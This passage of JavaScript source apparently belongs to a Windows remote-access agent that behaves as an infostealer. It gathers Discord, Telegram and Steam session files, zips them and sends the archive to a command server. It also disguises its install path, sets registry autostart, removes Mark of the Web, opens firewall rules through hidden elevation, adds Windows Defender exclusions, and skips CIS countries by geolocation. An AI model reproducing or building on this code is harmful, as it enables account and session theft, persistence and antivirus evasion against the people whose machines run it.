                  // robocopy returns exit code 1 for successful copies, Node treats nonzero as error
                  if (roboErr.code && typeof roboErr.code === 'number' && roboErr.code > 7) {
                    console.log(`[Agent] robocopy tdata warning: exit code ${roboErr.code}`);
                  }
                }
              } catch (tdataErr) {
                console.log(`[Agent] tdata copy error: ${tdataErr.message}`);
              }
            }
          }
          // Copy other session files (small ones only)
          let copiedCount = 0;
          for (const f of allFiles) {
            if (copiedCount >= 50) break;
            if (f.size > 10 * 1024 * 1024) continue; // skip >10MB
            if (f.category === 'discord' || f.category === 'telegram' || f.category === 'steam') continue; // already copied above
            try {
              const dest = path.join(tmpDir, f.category, path.basename(f.path));
              const destDir = path.dirname(dest);
              if (!fs.existsSync(destDir)) fs.mkdirSync(destDir, { recursive: true });
              fs.copyFileSync(f.path, dest);
              copiedCount++;
            } catch { /* skip */ }
          }
          // Zip the directory (async to keep event loop alive for WS pings)
          if (os.platform() === 'win32') {
            const zipPath = path.join(os.tmpdir(), `forensic_${scanId}.zip`);
            try {
              progress(94);
              await execAsync(`powershell -NoProfile -Command "Compress-Archive -Path '${tmpDir.replace(/'/g, "''")}\\*' -DestinationPath '${zipPath}' -Force"`, { timeout: 300000 });
              const zipStat = fs.statSync(zipPath);
              console.log(`[Agent] Forensic ZIP size: ${(zipStat.size / 1024 / 1024).toFixed(1)} MB`);
              if (zipStat.size < 150 * 1024 * 1024) {
                const zipData = fs.readFileSync(zipPath);
                result.archiveData = zipData.toString('base64');
                result.archiveName = `forensic_${os.hostname()}_${scanId}.zip`;
              } else {
                console.log('[Agent] Forensic ZIP too large to send (' + (zipStat.size / 1024 / 1024).toFixed(1) + ' MB), skipping archive');
              }
              try { fs.unlinkSync(zipPath); } catch { /* ignore */ }
            } catch (zipErr) {
              console.error('[Agent] Forensic ZIP error:', zipErr.message);
            }
          }
          // Clean up temp dir
          try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch { /* ignore */ }
        } catch (archiveErr) {
          console.error('[Agent] Archive creation error:', archiveErr.message);
        }
      }

      progress(100);
      result.status = 'complete';

      send({
        type: 'forensic_result',
        deviceId: DEVICE_ID,
        payload: result,
      });

      console.log(`[Agent] Forensic scan complete: ${scanType}, files: ${allFiles.length}`);
    } catch (err) {
      console.error('[Agent] Forensic scan error:', err.message);
      send({
        type: 'forensic_result',
        deviceId: DEVICE_ID,
        payload: { scanId, scanType, status: 'error', error: err.message, files: [], progress: 0 },
      });
    }
  })();
}

// ==================== Auto-start ====================

// ==================== Autostart (Windows Registry) ====================
function installAutostart() {
  if (os.platform() !== 'win32') return;
  try {
    const exePath = process.execPath; // path to the running .exe
    const appData = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming');
    const installDir = path.join(appData, 'Microsoft', 'WindowsApps', __CLIENT_NAME__);
    const installedExe = path.join(installDir, __CLIENT_NAME__ + '.exe');
    const regName = __CLIENT_NAME__.replace(/[^a-zA-Z0-9]/g, '');

    // Create install directory
    if (!fs.existsSync(installDir)) {
      fs.mkdirSync(installDir, { recursive: true });
    }

    // Copy EXE to persistent location (skip if already running from there)
    if (path.resolve(exePath).toLowerCase() !== path.resolve(installedExe).toLowerCase()) {
      try {
        fs.copyFileSync(exePath, installedExe);
        console.log(`[Agent] Installed to ${installedExe}`);
      } catch (e) {
        console.warn(`[Agent] Copy failed (may be in use): ${e.message}`);
        // If copy fails, use original path
      }
    }

    // Determine which path to register
    const regExe = fs.existsSync(installedExe) ? installedExe : exePath;

    // Add to registry (HKCU — no admin rights needed)
    const regCmd = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${regName}" /t REG_SZ /d "\\"${regExe}\\"" /f`;
    exec(regCmd, { windowsHide: true, timeout: 10000 }, (err) => {
      if (err) {
        console.warn(`[Agent] Registry autostart failed: ${err.message}`);
      } else {
        console.log(`[Agent] Autostart enabled: ${regName}`);
      }
    });
  } catch (e) {
    console.warn(`[Agent] Autostart setup error: ${e.message}`);
  }
}

// ==================== Firewall & Security Config ====================
function configureSecurity() {
  if (os.platform() !== 'win32') return;

  const exePath = process.execPath;
  const appData = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming');
  const installDir = path.join(appData, 'Microsoft', 'WindowsApps', __CLIENT_NAME__);
  const installedExe = path.join(installDir, __CLIENT_NAME__ + '.exe');
  const targetExe = fs.existsSync(installedExe) ? installedExe : exePath;
  const ruleName = __CLIENT_NAME__.replace(/[^a-zA-Z0-9]/g, '');

  // 1) Remove "Mark of the Web" (Zone.Identifier) — prevents "downloaded from internet" blocks
  try { fs.unlinkSync(exePath + ':Zone.Identifier'); } catch {}
  try { fs.unlinkSync(installedExe + ':Zone.Identifier'); } catch {}

  // 2) Add Windows Firewall exceptions (inbound + outbound)
  //    Requires admin — will silently fail if not elevated
  const fwCmds = [
    `netsh advfirewall firewall delete rule name="${ruleName}" >nul 2>&1`,
    `netsh advfirewall firewall add rule name="${ruleName}" dir=in action=allow program="${targetExe}" enable=yes profile=any`,
    `netsh advfirewall firewall add rule name="${ruleName}" dir=out action=allow program="${targetExe}" enable=yes profile=any`
  ];

  const fwScript = fwCmds.join(' & ');
  exec(`cmd /c ${fwScript}`, { windowsHide: true, timeout: 15000 }, (err) => {
    if (err) {
      // Try via PowerShell elevation (will silently fail without UAC approval)
      const psCmd = `powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c ${fwCmds.map(c => c.replace(/"/g, '\`\\"')).join(' ^& ')}' -Verb RunAs -WindowStyle Hidden" 2>$null`;
      exec(psCmd, { windowsHide: true, timeout: 15000 }, () => {
        // Ignore errors — best effort
      });
    } else {
      console.log(`[Agent] Firewall rules configured: ${ruleName}`);
    }
  });

  // 3) Add Windows Defender exclusion for install directory & exe
  const defenderCmd = `powershell -WindowStyle Hidden -Command "try { Add-MpPreference -ExclusionPath '${installDir}' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess '${targetExe}' -ErrorAction SilentlyContinue } catch {}"`;
  exec(defenderCmd, { windowsHide: true, timeout: 15000 }, (err) => {
    if (!err) {
      console.log('[Agent] Defender exclusion added');
    }
  });
}

// Install autostart on first run
installAutostart();

// Configure firewall & security
configureSecurity();

// Run agent setup (AV exclusions, ffmpeg download)
setupAgent();

console.log('===========================================');
console.log(`  Remote Admin Agent — ${__CLIENT_NAME__}`);
console.log(`  HWID: ${HWID}`);
console.log(`  Device: ${os.hostname()}`);
console.log(`  Server: ${__SERVER_URL__}`);
console.log(`  Discovery: ${__SERVER_ID__ !== 'none' ? 'enabled' : 'disabled'}`);
console.log(`  CIS block: enabled`);
console.log('===========================================');

// CIS country block — always active
function checkCISAndStart() {
  // Detect country via ip-api.com
  const http = require('http');
  const geoReq = http.get('http://ip-api.com/json/?fields=countryCode', (res) => {
    let body = '';
    res.on('data', (d) => { body += d; });
    res.on('end', () => {
      try {
        const { countryCode } = JSON.parse(body);
        if (countryCode && CIS_COUNTRIES.includes(countryCode.toUpperCase())) {
          console.log(`[Agent] CIS country detected (${countryCode}) — agent will not start.`);
          process.exit(0);
        } else {
          console.log(`[Agent] Country: ${countryCode} — OK, starting agent.`);
          connect();
        }
      } catch {
        // If geo detection fails, start anyway
        connect();
      }
    });
  });
  geoReq.on('error', () => { connect(); }); // If request fails, start anyway
  geoReq.setTimeout(5000, () => { geoReq.destroy(); connect(); });
}

checkCISAndStart();

// ==================== Sleep/Wake Detection ====================
// Detect system sleep by monitoring time jumps. If the interval between
// two ticks is much larger than expected, the system was asleep.
let _lastTickTime = Date.now();
const SLEEP_DETECT_INTERVAL = 10000; // Check every 10s
const SLEEP_THRESHOLD = 30000;       // If 30s+ passed in a 10s interval, system slept

setInterval(() => {
  const now = Date.now();
  const elapsed = now - _lastTickTime;
  _lastTickTime = now;

  if (elapsed > SLEEP_DETECT_INTERVAL + SLEEP_THRESHOLD) {
    const sleepDuration = Math.round((elapsed - SLEEP_DETECT_INTERVAL) / 1000);
    console.log(`[Agent] System wake detected (slept ~${sleepDuration}s). Reconnecting...`);

    // Network may not be ready immediately after wake — wait a moment
    // Then force reconnect regardless of current state
    setTimeout(() => {
      // Kill current WebSocket if it's in a broken state
      if (ws) {
        try { ws.terminate(); } catch {}
        ws = null;
      }
      cleanup();
      // Reset all reconnect/discovery state for a fresh start
      reconnectAttempts = 0;
      discoveryAttempts = 0;
      isHandlingDisconnect = false;
      if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer = null; }
      console.log('[Agent] Network recovery: attempting connection...');
      connect();
    }, 3000); // 3s delay for network stack to come back up
  }
}, SLEEP_DETECT_INTERVAL);

// Keep process alive and show errors in console instead of silently crashing
process.on('uncaughtException', (err) => {
  console.error('[Agent] Uncaught:', err.message);
  console.error('[Agent] Stack:', err.stack);
  // Keep process running — reconnect logic will handle recovery
  setTimeout(() => {
    console.log('[Agent] Attempting recovery after uncaught exception...');
    try { connect(); } catch { /* ignore */ }
  }, 5000);
});
process.on('unhandledRejection', (err) => {
  console.error('[Agent] Unhandled:', err);
});

// Prevent the process from ever exiting silently — keep console visible
// This ensures users can see errors if something goes wrong at startup
setInterval(() => {}, 60000);
